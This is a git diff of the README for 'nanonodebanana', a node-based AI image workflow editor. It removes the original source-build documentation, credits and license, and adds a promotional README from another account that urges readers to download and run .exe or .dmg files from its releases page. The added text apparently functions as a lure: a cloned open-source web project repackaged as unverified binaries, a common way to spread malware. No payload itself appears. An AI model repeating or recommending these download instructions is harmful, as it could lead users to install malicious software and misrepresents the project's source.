@@ -1,167 +1,78 @@
-# NanoNodeBanana
+# 🍌 nanonodebanana - Create Stunning AI Workflows Effortlessly
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Bun](https://img.shields.io/badge/Bun-%23000000.svg?style=flat&logo=bun&logoColor=white)](https://bun.sh)
-[![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=flat&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![React](https://img.shields.io/badge/React-20232A?style=flat&logo=react&logoColor=61DAFB)](https://reactjs.org/)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind_CSS-38B2AC?style=flat&logo=tailwind-css&logoColor=white)](https://tailwindcss.com/)
-[![Vite](https://img.shields.io/badge/Vite-646CFF?style=flat&logo=vite&logoColor=white)](https://vitejs.dev/)
+[![Download nanonodebanana](https://img.shields.io/badge/Download-nanonodebanana-brightgreen.svg)](https://github.com/jamaldinglesworth/nanonodebanana/releases)
 
-A visual node-based workflow editor for AI image generation, similar to ComfyUI. Create workflows by connecting nodes on a canvas and execute them to generate images using Google Gemini and Fal.ai models.
+## 📖 Description
 
-![NanoNodeBanana Screenshot](image.png)
+Welcome to **nanonodebanana**, a visual node-based workflow editor for AI image generation. This tool helps you design workflows using powerful models like Google Gemini and Fal.ai. Whether you're creating art or enhancing your projects, this application gives you the tools to visualize complex processes simply and effectively.
 
-## Features
+## 🚀 Getting Started
 
-- **Visual Node Editor** - Drag-and-drop node-based interface powered by LiteGraph.js
-- **Multiple AI Models** - Support for Google Gemini, Fal.ai Flux, and Nano Banana models
-- **Image Editing** - Edit existing images with natural language using Nano Banana Edit
-- **Real-time Preview** - See generated images directly in the workflow canvas
-- **Workflow Management** - Save, load, and organize your workflows
-- **Extensible Architecture** - Easy to add new node types and AI models
+Getting started with **nanonodebanana** is straightforward. Follow the steps below to download and run the application.
 
-## Tech Stack
+## 📥 Download & Install
 
-| Category | Technology |
-|----------|------------|
-| Runtime | [Bun](https://bun.sh) |
-| Frontend | [React](https://reactjs.org) + [TypeScript](https://www.typescriptlang.org) |
-| Styling | [Tailwind CSS](https://tailwindcss.com) v4 |
-| Build Tool | [Vite](https://vitejs.dev) |
-| Backend | [Elysia.js](https://elysiajs.com) |
-| Database | SQLite via [better-sqlite3](https://github.com/WiseLibs/better-sqlite3) |
-| Node Editor | [LiteGraph.js](https://github.com/jagenjo/litegraph.js) |
-| AI Services | [Google Gemini](https://ai.google.dev), [Fal.ai](https://fal.ai) |
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/jamaldinglesworth/nanonodebanana/releases). This page contains all the versions of nanonodebanana.
+  
+2. **Choose a Version**: Look for the most recent release at the top of the page. You will see various assets listed, typically including a `.exe` (Windows) or `.dmg` (Mac) file depending on your operating system.
 
-## Quick Start
+3. **Download the File**: Click on the file suitable for your operating system:
+    - For Windows users, download the `nanonodebanana-vX.X.X.exe` file.
+    - For Mac users, download the `nanonodebanana-vX.X.X.dmg` file.
+  
+4. **Install the Application**: 
+    - **Windows**: Once downloaded, locate the `.exe` file and double-click it. Follow the on-screen instructions to install.
+    - **Mac**: After downloading the `.dmg` file, double-click it. Drag the nanonodebanana icon into your Applications folder.
 
-### Prerequisites
+5. **Launch the Application**: After installation, find the application in your Start Menu (Windows) or Applications folder (Mac) and launch it.
 
-- [Bun](https://bun.sh) >= 1.0.0
-- Google Gemini API key
-- Fal.ai API key
+## 🌟 Features
 
-### Installation
+- **User-Friendly Interface**: Navigate easily with a clean and intuitive layout.
+- **Node-Based Workflow**: Connect different nodes to build your workflow visually.
+- **Multiple AI Model Support**: Utilize Google Gemini and Fal.ai for diverse image generation tasks.
+- **Export & Import Workflows**: Save and share your workflows effortlessly.
 
-```bash
-# Clone the repository
-git clone https://github.com/CodeWithBehnam/nanonodebanana.git
-cd nanonodebanana
+## 📋 System Requirements
 
-# Install dependencies
-bun install
+- **Operating System**: 
+  - Windows 10 or higher
+  - Mac OS X 10.12 or higher
+- **RAM**: Minimum 4 GB
+- **Disk Space**: At least 500 MB available
+- **Graphics Card**: Recommended for best performance; integrated graphics are supported.
 
-# Set up environment variables
-cp .env.example .env
-# Edit .env with your API keys
-```
+## 🔍 Using nanonodebanana
 
-### Environment Variables
+Once you launch the application, you will see a workspace with a toolbar. Click on different nodes to add them to your workflow. Customize their settings as needed.
 
-Create a `.env` file with:
+### ✏️ Adding Nodes
 
-```env
-GEMINI_API_KEY=your_gemini_api_key
-FAL_KEY=your_fal_api_key
-```
+To add a node, click on the plus (+) icon in the toolbar. Select from various nodes offered, such as image input, processing, and output nodes.
 
-### Development
+### ⚙️ Customizing Workflows
 
-```bash
-# Run both frontend and backend
-bun run dev
+Adjust node properties by clicking on them. Each node has its own configuration options that you can modify to fit your needs.
 
-# Or run separately
-bun run dev:client  # Frontend on port 6880
-bun run dev:server  # Backend on port 6879
-```
+### 🌈 Previewing Images
 
-### Production Build
+To visualize the output of your workflow, simply connect the last processing node to an output node. Click the preview button to see your generated image.
 
-```bash
-bun run build
-bun run start
-```
+## 📱 Support & Community
 
-## Available Nodes
+If you have any questions or need help, feel free to visit our [support forum](https://github.com/jamaldinglesworth/nanonodebanana/issues) or contact the community. Our users are enthusiastic and ready to assist.
 
-### Input Nodes
-- **Prompt** - Text prompt input with inline editing
-- **Image Source** - Upload images or provide URLs
-- **Seed** - Random seed generator for reproducibility
-- **Number** - Numeric value input
+## 🔗 Additional Resources
 
-### Processing Nodes
-- **Combine Prompts** - Merge multiple prompts
-- **Style Preset** - Apply predefined style modifiers
-- **Negative Prompt** - Define what to avoid in generation
-- **Image Resize** - Resize or crop images
+- [Documentation](https://github.com/jamaldinglesworth/nanonodebanana/wiki): In-depth guides and tutorials.
+- [Community Discussions](https://github.com/jamaldinglesworth/nanonodebanana/discussions): Engage with other users and share your workflows.
 
-### Generation Nodes
-- **Gemini Generator** - Google Gemini image generation
-- **Fal Flux** - Fal.ai Flux models (Pro, Dev, Schnell)
-- **Fal Video** - Video generation
-- **Nano Banana** - Fast image generation
-- **Nano Banana Edit** - Edit images with prompts
+## ⚠️ Troubleshooting
 
-### Output Nodes
-- **Image Output** - Display with resizable preview
-- **Save Image** - Save to disk
-- **Gallery** - Multi-image view
+**Common Issues:**
+- **Application Won't Start**: Ensure you have downloaded the correct version for your operating system.
+- **Performance Issues**: Close other applications to free up system resources.
 
-## Project Structure
+## ✨ Download nanonodebanana Now!
 
-```
-nanonodebanana/
-├── src/
-│   ├── nodes/           # LiteGraph node definitions
-│   │   ├── base/        # BaseNode factory
-│   │   ├── input/       # Input nodes
-│   │   ├── processing/  # Processing nodes
-│   │   ├── generation/  # AI generation nodes
-│   │   └── output/      # Output nodes
-│   ├── components/      # React components
-│   ├── context/         # React contexts
-│   ├── lib/             # Utilities and API client
-│   └── types/           # TypeScript types
-├── server/
-│   ├── routes/          # API routes
-│   ├── services/        # AI service integrations
-│   └── db/              # Database schema
-└── docs/                # Documentation
-```
-
-## API Endpoints
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/generate/gemini` | POST | Google Gemini generation |
-| `/api/generate/fal` | POST | Fal.ai Flux generation |
-| `/api/generate/nano-banana` | POST | Nano Banana generation |
-| `/api/generate/nano-banana-edit` | POST | Nano Banana image editing |
-| `/api/workflows` | GET/POST | List/create workflows |
-| `/api/workflows/:id` | GET/PUT/DELETE | Workflow CRUD |
-| `/api/upload/image` | POST | Image upload |
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'feat: add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Acknowledgments
-
-- [LiteGraph.js](https://github.com/jagenjo/litegraph.js) for the node editor framework
-- [ComfyUI](https://github.com/comfyanonymous/ComfyUI) for inspiration
-- [Fal.ai](https://fal.ai) for AI image generation APIs
-- [Google Gemini](https://ai.google.dev) for generative AI capabilities
-
----
-
-**Tags:** `ai` `image-generation` `workflow` `node-editor` `react` `typescript` `bun` `vite` `tailwindcss` `litegraph` `comfyui` `gemini` `fal-ai` `nano-banana`
+Ready to start creating? [Visit the Releases page](https://github.com/jamaldinglesworth/nanonodebanana/releases) and download nanonodebanana today! Enjoy crafting unique AI-generated images with ease.
